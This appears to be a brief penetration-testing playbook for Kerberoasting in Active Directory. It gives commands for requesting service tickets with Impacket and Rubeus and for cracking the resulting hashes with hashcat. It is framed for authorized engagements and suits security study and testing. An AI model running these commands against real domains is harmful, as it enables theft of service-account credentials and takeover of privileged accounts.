# Kerberoasting Attack

## When to Use
- When you have obtained initial access to an Active Directory domain (valid user credentials or a compromised domain-joined machine).
- To compromise service accounts, which often have elevated privileges (like Domain Admin) and rarely changed passwords.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying SPNs and Requesting Tickets (Linux/Impacket)

Using valid domain credentials from a Linux attack machine:

```bash
# Concept: Query AD for accounts with SPNs and request TGS tickets formatted for Hashcat impacket-GetUserSPNs target.local/low_priv_user:Password123! -request -outputfile kerberoast_hashes.txt -format hashcat
```

### Phase 2: Extracting Hashes from a Windows Host (Rubeus)

If executing directly from a compromised Windows workstation (where you are already authenticated as a domain user):

```powershell
# Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
```

### Phase 3: Offline Password Cracking

Extract the hashes from the output file and run them through Hashcat.
Hashcat mode for Kerberoast (RC4) is `13100`. (If AES, mode is `19600` or `19700`).

```bash
# hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt -O
```
